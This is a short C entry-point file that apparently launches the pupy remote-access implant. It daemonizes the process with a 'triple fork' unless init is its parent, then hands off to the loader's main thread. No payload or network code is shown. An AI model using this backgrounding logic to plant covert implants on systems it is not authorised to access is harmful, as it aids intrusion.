#include <sys/types.h>
#include <unistd.h>

#include "pupy_load.h"
#include "daemonize.h"

#ifdef Linux
#include <mcheck.h>
#endif

int main(int argc, char *argv[], char *env[]) {
#ifndef DEBUG
    bool triple_fork = true;

    /* If we are launched directly from the init - don't do the triple fork
       dance. This is important in case we are launched from upstart */

    if (getppid() == 1)
        triple_fork = false;

    daemonize(argc, argv, env, triple_fork);
#else
#ifdef Linux
    mtrace();
#endif
#endif
    return mainThread(argc, argv, false);
}
